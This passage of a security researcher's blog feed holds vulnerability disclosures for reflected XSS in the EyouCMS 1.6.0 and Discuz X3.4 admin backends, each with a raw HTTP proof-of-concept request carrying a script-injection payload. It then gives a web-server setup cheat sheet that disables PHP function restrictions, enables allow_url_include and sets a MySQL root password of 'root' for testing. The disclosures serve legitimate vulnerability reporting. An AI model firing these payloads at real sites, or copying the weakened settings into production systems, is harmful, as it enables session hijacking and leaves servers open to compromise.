class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/cms/eyoucms/login.php?m=admin&amp;c=Field&amp;a=arctype_add&amp;_ajax=1&amp;lang=cn</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:80</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>application/json, text/javascript, */*; q=0.01</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://127.0.0.1</span><br><span class="line"><span class="attribute">X-Requested-With</span><span class="punctuation">: </span>XMLHttpRequest</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://127.0.0.1/cms/eyoucms/login.php?m=admin&amp;c=Field&amp;a=arctype_add&amp;lang=cn</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=lmqk1pcmj5egvt269qo4ijgg82; admin_lang=cn; home_lang=cn; referurl=http%3A%2F%2F127.0.0.1%2Fcms%2Feyoucms%2Findex.php%3Fm%3Duser%26c%3DPay%26a%3Dpay_consumer_details; users_id=1; ENV_IS_UPHTML=0; ENV_LIST_URL=%2Feyoucms%2Flogin.php%3Fm%3Dadmin%26c%3DArchives%26a%3Dindex_draft%26lang%3Dcn; ENV_GOBACK_URL=%2Feyoucms%2Flogin.php%3Fm%3Dadmin%26c%3DArchives%26a%3Dindex_draft%26lang%3Dcn%26keywords%3Dfvg; workspaceParam=switch_map%7CIndex</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>91</span><br><span class="line"></span><br><span class="line"><span class="language-sas">channel_id=-99<span class="variable">&amp;remark</span>=af<span class="variable">&amp;dfvalue</span>=<span class="variable">&amp;dtype</span>=text<span class="variable">&amp;name</span>=&lt;script&gt;alert(1)&lt;/script&gt;<span class="title function_">%C0aef</span><span class="variable">&amp;title</span>=aef</span></span><br></pre></td></tr></table></figure><p><img src="/2023/02/15/Vulnerability-EyouCMS-V1.6.0-Backend-Reflected-XSS-(CVE-2022-45540)/201618239-d45d61ad-ed2c-446c-b236-badcf8c8145c.png"></p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ul><li><a href="https://github.com/weng-xianhu/eyoucms/issues/37">Github Issue</a></li><li><a href="https://www.cve.org/CVERecord?id=CVE-2022-45540">CVE</a></li></ul><blockquote><p>Reported by Srpopty, vulnerability discovered by using Corax.</p></blockquote>]]></content>
    
    
    <summary type="html">EyouCMS-V1.6.0-UTF8-SP1 with Backend Reflected Cross-Site Scripting in backend login.php when adding article type.</summary>
    
    
    
    <category term="Vulnerability" scheme="https://srpopty.github.io/categories/Vulnerability/"/>
    
    
    <category term="Web" scheme="https://srpopty.github.io/tags/Web/"/>
    
    <category term="CVE" scheme="https://srpopty.github.io/tags/CVE/"/>
    
    <category term="XSS" scheme="https://srpopty.github.io/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>EyouCMS V1.6.0 Backend Reflected XSS (CVE-2022-45539)</title>
    <link href="https://srpopty.github.io/2023/02/15/Vulnerability-EyouCMS-V1.6.0-Backend-Reflected-XSS-(CVE-2022-45539)/"/>
    <id>https://srpopty.github.io/2023/02/15/Vulnerability-EyouCMS-V1.6.0-Backend-Reflected-XSS-(CVE-2022-45539)/</id>
    <published>2023-02-15T12:38:21.000Z</published>
    <updated>2023-02-15T12:38:21.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h1><p>Backend file adding with reflected-XSS in the GET value <code>activepath</code>.</p><h1 id="Affected-Version"><a href="#Affected-Version" class="headerlink" title="Affected Version"></a>Affected Version</h1><p>EyouCMS &lt;= 1.6.0-UTF8-SP1</p><p><img src="/2023/02/15/Vulnerability-EyouCMS-V1.6.0-Backend-Reflected-XSS-(CVE-2022-45539)/201610031-73f82844-05e0-4182-a275-028613c349bd.png"></p><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/cms/eyoucms/login.php?m=admin&amp;c=Filemanager&amp;a=newfile&amp;activepath=%3Atemplate&quot;/&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;a&amp;lang=cn</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:80</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://127.0.0.1</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://127.0.0.1/cms/eyoucms/login.php?m=admin&amp;c=Filemanager&amp;a=index&amp;lang=cn</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=lmqk1pcmj5egvt269qo4ijgg82; admin_lang=cn; home_lang=cn; referurl=http%3A%2F%2F127.0.0.1%2Fcms%2Feyoucms%2Findex.php%3Fm%3Duser%26c%3DPay%26a%3Dpay_consumer_details; users_id=1; ENV_IS_UPHTML=0; ENV_LIST_URL=%2Feyoucms%2Flogin.php%3Fm%3Dadmin%26c%3DArchives%26a%3Dindex_draft%26lang%3Dcn; ENV_GOBACK_URL=%2Feyoucms%2Flogin.php%3Fm%3Dadmin%26c%3DArchives%26a%3Dindex_draft%26lang%3Dcn%26keywords%3Dfvg; workspaceParam=switch_map%7CIndex</span><br></pre></td></tr></table></figure><p><img src="/2023/02/15/Vulnerability-EyouCMS-V1.6.0-Backend-Reflected-XSS-(CVE-2022-45539)/201619455-f28827d5-5826-4241-8fcd-9a7a8821f0d9.png"></p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ul><li><a href="https://github.com/weng-xianhu/eyoucms/issues/38">Github Issue</a></li><li><a href="https://www.cve.org/CVERecord?id=CVE-2022-45539">CVE</a></li></ul><blockquote><p>Reported by Srpopty, vulnerability discovered by using Corax.</p></blockquote>]]></content>
    
    
    <summary type="html">EyouCMS-V1.6.0-UTF8-SP1 with Backend Reflected Cross-Site Scripting in backend in login.php when adding file.</summary>
    
    
    
    <category term="Vulnerability" scheme="https://srpopty.github.io/categories/Vulnerability/"/>
    
    
    <category term="Web" scheme="https://srpopty.github.io/tags/Web/"/>
    
    <category term="CVE" scheme="https://srpopty.github.io/tags/CVE/"/>
    
    <category term="XSS" scheme="https://srpopty.github.io/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>Discuz X3.4 Backend Reflected XSS (CVE-2022-45543)</title>
    <link href="https://srpopty.github.io/2023/02/15/Vulnerability-Discuz-X3.4-Reflected-XSS-(CVE-2022-45543)/"/>
    <id>https://srpopty.github.io/2023/02/15/Vulnerability-Discuz-X3.4-Reflected-XSS-(CVE-2022-45543)/</id>
    <published>2023-02-15T12:25:54.000Z</published>
    <updated>2023-02-15T12:25:54.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h1><p>Admin backend audit search of content audit component with reflected-XSS in POST value <code>dateline</code>, <code>title</code>, <code>tpp</code> and <code>username</code>, which bypassed discuz security check and even could hijack callback url link, and it can also inject javascript to setTimeout at the end of html response.</p><h1 id="Affected-Version"><a href="#Affected-Version" class="headerlink" title="Affected Version"></a>Affected Version</h1><p>DiscuzX &lt;= 3.4, SC_UTF8_20221111</p><p><img src="/2023/02/15/Vulnerability-Discuz-X3.4-Reflected-XSS-(CVE-2022-45543)/da3b14b2_12015184.png"></p><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/cms/discuz/upload/admin.php?action=moderate&amp;operation=threads</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.0.4</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>166</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://192.168.0.4</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://192.168.0.4/cms/discuz/upload/admin.php?action=moderate&amp;operation=threads</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>5Kkn_2132_saltkey=y03s5T45; 5Kkn_2132_lastvisit=1668496347; 5Kkn_2132_ulastactivity=07108qps3b3FkXEEZNxrT%2BtyQpXYN9%2FSOodQCNbMLoO%2BO6DOk8pF; 5Kkn_2132_auth=7791L55DZFdkAgcM5rDcnjIiVH0t%2BptlGCIqLkAhUIRMsUDTnq%2BGi7atBCt%2BPdyl2mCVv0hA3jA%2BxaOfDB1h; 5Kkn_2132_lastcheckfeed=1%7C1668501456; 5Kkn_2132_nofavfid=1; 5Kkn_2132_sid=yhpz44; 5Kkn_2132_lip=172.17.0.1%2C1668502019; 5Kkn_2132_lastact=1668502045%09admin.php%09</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-dts"><span class="attr">formhash</span><span class="operator">=</span><span class="number">288</span>a0c1d<span class="variable">&amp;scrolltop</span>=<span class="variable">&amp;anchor</span>=<span class="variable">&amp;username</span>=aa<span class="variable">&amp;title</span>=aa<span class="variable">&amp;tpp</span>=<span class="number">20</span><span class="variable">&amp;filter</span>=normal<span class="variable">&amp;modfid</span>=all<span class="variable">&amp;dateline</span>=<span class="number">604</span><span class="string">&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;!--&amp;modsubmit=%E6%8F%90%E4%BA%A4</span></span></span><br></pre></td></tr></table></figure><p><img src="/2023/02/15/Vulnerability-Discuz-X3.4-Reflected-XSS-(CVE-2022-45543)/a98c544f_12015184.png"></p><p><img src="/2023/02/15/Vulnerability-Discuz-X3.4-Reflected-XSS-(CVE-2022-45543)/c20f32f9_12015184.png"></p><p><img src="/2023/02/15/Vulnerability-Discuz-X3.4-Reflected-XSS-(CVE-2022-45543)/d35d3b7c_12015184.png"></p><p><img src="/2023/02/15/Vulnerability-Discuz-X3.4-Reflected-XSS-(CVE-2022-45543)/0d4be145_12015184.png"></p><p><img src="/2023/02/15/Vulnerability-Discuz-X3.4-Reflected-XSS-(CVE-2022-45543)/b518294b_12015184.png"></p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ul><li><a href="https://gitee.com/Discuz/DiscuzX/issues/I61CR2">Gitee Issue</a> (Login Required)</li><li><a href="https://www.cve.org/CVERecord?id=CVE-2022-45543">CVE</a></li></ul><blockquote><p>Reported by Srpopty, vulnerability discovered by using Corax.</p></blockquote>]]></content>
    
    
    <summary type="html">Discuz-X3.4-SC_UTF8_20221111 with Backend Reflected Cross-Site Scripting in admin.php auditing content.</summary>
    
    
    
    <category term="Vulnerability" scheme="https://srpopty.github.io/categories/Vulnerability/"/>
    
    
    <category term="Web" scheme="https://srpopty.github.io/tags/Web/"/>
    
    <category term="CVE" scheme="https://srpopty.github.io/tags/CVE/"/>
    
    <category term="XSS" scheme="https://srpopty.github.io/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>Web Server Environment Configuration CheatSheet</title>
    <link href="https://srpopty.github.io/2023/02/15/Web-Server-Environment-Configuration-CheatSheet/"/>
    <id>https://srpopty.github.io/2023/02/15/Web-Server-Environment-Configuration-CheatSheet/</id>
    <published>2023-02-15T07:19:15.000Z</published>
    <updated>2023-02-15T07:19:15.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Basic-Environment"><a href="#Basic-Environment" class="headerlink" title="Basic Environment"></a>Basic Environment</h1><p> 基础环境配置，安装常用 shell 工具。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update &amp;&amp; sudo apt-get upgrade -y &amp;&amp; sudo apt-get dist-upgrade -y &amp;&amp; sudo apt autoremove -y</span><br><span class="line">sudo apt-get install -y zsh vim curl wget cloc unzip zip graphviz tree build-essential make cmake git openssh-server netcat net-tools tmux</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;set -g mouse on&quot;</span> &gt; ~/.tmux.conf</span><br></pre></td></tr></table></figure><h2 id="ZSH"><a href="#ZSH" class="headerlink" title="ZSH"></a>ZSH</h2><p> 安装 zsh，更换默认 shell 为 oh-my-zsh，同时安装语法高亮与自动补全插件，并且更换 zsh 的主题为 bira。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">chsh -s $(<span class="built_in">which</span> zsh)</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/ohmyzsh/ohmyzsh.git ~/.oh-my-zsh</span><br><span class="line"><span class="built_in">cp</span> ~/.oh-my-zsh/templates/zshrc.zsh-template ~/.zshrc</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/zsh-users/zsh-syntax-highlighting.git <span class="variable">$&#123;ZSH_CUSTOM:-~/.oh-my-zsh/custom&#125;</span>/plugins/zsh-syntax-highlighting</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/zsh-users/zsh-autosuggestions.git <span class="variable">$&#123;ZSH_CUSTOM:-~/.oh-my-zsh/custom&#125;</span>/plugins/zsh-autosuggestions</span><br><span class="line">sed -i <span class="string">&#x27;s/plugins=(git)/plugins=(git zsh-syntax-highlighting zsh-autosuggestions)/g&#x27;</span> ~/.zshrc</span><br><span class="line">sed -i <span class="string">&#x27;s/ZSH_THEME=&quot;robbyrussell&quot;/ZSH_THEME=&quot;bira&quot;/g&#x27;</span> ~/.zshrc</span><br></pre></td></tr></table></figure><h2 id="V2ray"><a href="#V2ray" class="headerlink" title="V2ray"></a>V2ray</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo bash &lt;(curl -L https://raw.githubusercontent.com/v2fly/fhs-install-v2ray/master/install-release.sh)</span><br><span class="line">sudo vim /usr/local/etc/v2ray/config.json</span><br></pre></td></tr></table></figure><h1 id="Web-Server"><a href="#Web-Server" class="headerlink" title="Web Server"></a>Web Server</h1><h2 id="Apache2"><a href="#Apache2" class="headerlink" title="Apache2"></a>Apache2</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install -y apache2</span><br></pre></td></tr></table></figure><h3 id="Apache2-Configuration"><a href="#Apache2-Configuration" class="headerlink" title="Apache2 Configuration"></a>Apache2 Configuration</h3><p> 修改 Apache2 mpm-prefork 模式的并发数量。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo sed -i <span class="string">&quot;s/StartServers\s+\d+/StartServers 20/g&quot;</span> /etc/apache2/mods-available/mpm_prefork.conf</span><br><span class="line">sudo sed -i <span class="string">&quot;s/MinSpareServers\s+\d+/MinSpareServers 20/g&quot;</span> /etc/apache2/mods-available/mpm_prefork.conf</span><br><span class="line">sudo sed -i <span class="string">&quot;s/MaxSpareServers\s+\d+/MaxSpareServers 30/g&quot;</span> /etc/apache2/mods-available/mpm_prefork.conf</span><br><span class="line">sudo sed -i <span class="string">&quot;s/MaxClients\s+\d+/MaxClients 500/g&quot;</span> /etc/apache2/mods-available/mpm_prefork.conf</span><br><span class="line">sudo sed -i <span class="string">&quot;s/MaxRequestsPerChild\s+\d+/MaxRequestsPerChild 10000/g&quot;</span> /etc/apache2/mods-available/mpm_prefork.conf</span><br><span class="line">sudo sed -i <span class="string">&quot;11a\\\tServerLimit 500&quot;</span> /etc/apache2/mods-available/mpm_prefork.conf</span><br></pre></td></tr></table></figure><p> 开启 URL 重写，设置默认的 ServerName，并重启 Apache。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo sed -i <span class="string">&quot;s/AllowOverride None/AllowOverride ALL/g&quot;</span> /etc/apache2/apache2.conf</span><br><span class="line">sudo a2enmod rewrite</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;ServerName localhost&quot;</span> | sudo <span class="built_in">tee</span> -a /etc/apache2/apache2.conf</span><br><span class="line">sudo systemctl restart apache2</span><br></pre></td></tr></table></figure><h1 id="Server-Side-Languages"><a href="#Server-Side-Languages" class="headerlink" title="Server-Side Languages"></a>Server-Side Languages</h1><h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install -y php libapache2-mod-php</span><br></pre></td></tr></table></figure><h3 id="Dependency"><a href="#Dependency" class="headerlink" title="Dependency"></a>Dependency</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install -y <span class="string">&quot;php-(bcmath|gmp|ldap|simplexml|mysqli|curl|dom|xml|intl|pdo|gd|mysql|json|imap|imagick|sqlite3|zip|soap|mbstring|cgi|fpm|pear)&quot;</span></span><br><span class="line">sudo systemctl restart apache2</span><br></pre></td></tr></table></figure><h3 id="Composer"><a href="#Composer" class="headerlink" title="Composer"></a>Composer</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php -r <span class="string">&quot;copy(&#x27;https://getcomposer.org/installer&#x27;, &#x27;composer-setup.php&#x27;);&quot;</span>;</span><br><span class="line">sudo php composer-setup.php --install-dir=/usr/bin --filename=composer;</span><br><span class="line"><span class="built_in">rm</span> composer-setup.php</span><br></pre></td></tr></table></figure><h3 id="PHP-Multi-Version"><a href="#PHP-Multi-Version" class="headerlink" title="PHP Multi-Version"></a>PHP Multi-Version</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">sudo add-apt-repository ppa:ondrej/php &amp;&amp; sudo add-apt-repository ppa:ondrej/apache2</span><br><span class="line"><span class="comment"># Install another php.</span></span><br><span class="line">sudo apt-get install -y php5.6 php7.4 php8.1</span><br><span class="line">sudo apt-get install -y <span class="string">&quot;php5.6-(bcmath|gmp|ldap|mysqli|curl|dom|xml|intl|pdo|gd|mysql|json|imap|imagick|sqlite3|zip|soap|mbstring|cgi|fpm|pear)&quot;</span></span><br><span class="line">sudo apt-get install -y <span class="string">&quot;php7.4-(bcmath|gmp|ldap|mysqli|curl|dom|xml|intl|pdo|gd|mysql|json|imap|imagick|sqlite3|zip|soap|mbstring|cgi|fpm|pear)&quot;</span></span><br><span class="line">sudo apt-get install -y <span class="string">&quot;php8.1-(bcmath|gmp|ldap|mysqli|curl|dom|xml|intl|pdo|gd|mysql|json|imap|imagick|sqlite3|zip|soap|mbstring|cgi|fpm|pear)&quot;</span></span><br><span class="line">sudo apt-get update &amp;&amp; sudo apt-get upgrade -y &amp;&amp; sudo apt-get dist-upgrade -y &amp;&amp; sudo apt autoremove -y</span><br><span class="line"><span class="comment"># Switch php for apache. Disable current used php.</span></span><br><span class="line">sudo a2dismod php-7.4</span><br><span class="line"><span class="comment"># Enable the php which you want to use.</span></span><br><span class="line">sudo a2enmod php-8.1</span><br><span class="line"><span class="comment"># Reboot server.</span></span><br><span class="line">sudo systemctl restart apache2</span><br><span class="line"><span class="comment"># Switch php for commandline.</span></span><br><span class="line">sudo update-alternatives --config php</span><br></pre></td></tr></table></figure><h3 id="PHP-INI-Configuration"><a href="#PHP-INI-Configuration" class="headerlink" title="PHP INI Configuration"></a>PHP INI Configuration</h3><p> 仅在测试环境下可能会用到的配置，为了便于 debug。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">sudo sed -i <span class="string">&quot;s/disable_functions = /; disable_functions = /g&quot;</span> /etc/php/?.?/apache2/php.ini</span><br><span class="line">sudo sed -i <span class="string">&quot;s/max_execution_time = 30/max_execution_time = 60/g&quot;</span> /etc/php/?.?/apache2/php.ini</span><br><span class="line">sudo sed -i <span class="string">&quot;s/max_input_time = 60/max_input_time = -1/g&quot;</span> /etc/php/?.?/apache2/php.ini</span><br><span class="line">sudo sed -i <span class="string">&quot;s/;max_input_vars = 1000/max_input_vars = 3000/g&quot;</span> /etc/php/?.?/apache2/php.ini</span><br><span class="line">sudo sed -i <span class="string">&quot;s/memory_limit = 128M/memory_limit = 256M/g&quot;</span> /etc/php/?.?/apache2/php.ini</span><br><span class="line">sudo sed -i <span class="string">&quot;s/display_errors = Off/display_errors = On/g&quot;</span> /etc/php/?.?/apache2/php.ini</span><br><span class="line">sudo sed -i <span class="string">&quot;s/display_startup_errors = Off/display_startup_errors = On/g&quot;</span> /etc/php/?.?/apache2/php.ini</span><br><span class="line">sudo sed -i <span class="string">&quot;s/post_max_size = 8M/post_max_size = 32M/g&quot;</span> /etc/php/?.?/apache2/php.ini</span><br><span class="line">sudo sed -i <span class="string">&quot;s/allow_url_include = Off/allow_url_include = On/g&quot;</span> /etc/php/?.?/apache2/php.ini</span><br><span class="line">sudo sed -i <span class="string">&quot;s/;mysqli.allow_local_infile = On/mysqli.allow_local_infile = On/g&quot;</span> /etc/php/?.?/apache2/php.ini</span><br><span class="line">sudo sed -i <span class="string">&quot;s/session.gc_maxlifetime = 1440/session.gc_maxlifetime = 259200/g&quot;</span> /etc/php/?.?/apache2/php.ini</span><br><span class="line">sudo sed -i <span class="string">&quot;s/session.cookie_lifetime = 0/session.cookie_lifetime = 259200/g&quot;</span> /etc/php/?.?/apache2/php.ini</span><br><span class="line">sudo systemctl restart apache2</span><br></pre></td></tr></table></figure><h2 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install -y default-jdk</span><br></pre></td></tr></table></figure><h2 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install -y python2 python3 python3-pip python3-flask python3-django python3-requests python3-venv</span><br></pre></td></tr></table></figure><h2 id="NodeJS"><a href="#NodeJS" class="headerlink" title="NodeJS"></a>NodeJS</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">curl -fsSL https://deb.nodesource.com/setup_16.x | sudo -E bash -</span><br><span class="line">sudo apt-get install -y nodejs</span><br></pre></td></tr></table></figure><h2 id="GO"><a href="#GO" class="headerlink" title="GO"></a>GO</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo add-apt-repository ppa:longsleep/golang-backports</span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install -y golang-go</span><br></pre></td></tr></table></figure><h2 id="Rust"><a href="#Rust" class="headerlink" title="Rust"></a>Rust</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl --proto <span class="string">&#x27;=https&#x27;</span> --tlsv1.2 -sSf https://sh.rustup.rs | sh</span><br></pre></td></tr></table></figure><h2 id="C-C"><a href="#C-C" class="headerlink" title="C/C++"></a>C/C++</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install -y gcc g++</span><br></pre></td></tr></table></figure><h1 id="Database"><a href="#Database" class="headerlink" title="Database"></a>Database</h1><h2 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h2><p> 注意安装完成后需要从 <code>/etc/mysql/debian.cnf</code> 中获取默认的 MySQL 用户名和密码，用此用户名密码登录成功后再修改 root 的密码。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install -y mysql-server mysql-client</span><br><span class="line"><span class="comment"># Get mysql default username.</span></span><br><span class="line">sudo <span class="built_in">cat</span> /etc/mysql/debian.cnf | grep user</span><br><span class="line"><span class="comment"># Get mysql default password.</span></span><br><span class="line">sudo <span class="built_in">cat</span> /etc/mysql/debian.cnf | grep password</span><br><span class="line"><span class="comment"># Using it to login mysqsl.</span></span><br><span class="line">mysql -u xxxx -p</span><br><span class="line"><span class="comment"># Change password to &quot;root&quot;.</span></span><br><span class="line">mysql&gt; alter user <span class="string">&#x27;root&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span> identified with mysql_native_password by <span class="string">&#x27;root&#x27;</span>;</span><br></pre></td></tr></table></figure><h2 id="Redis"><a href="#Redis" class="headerlink" 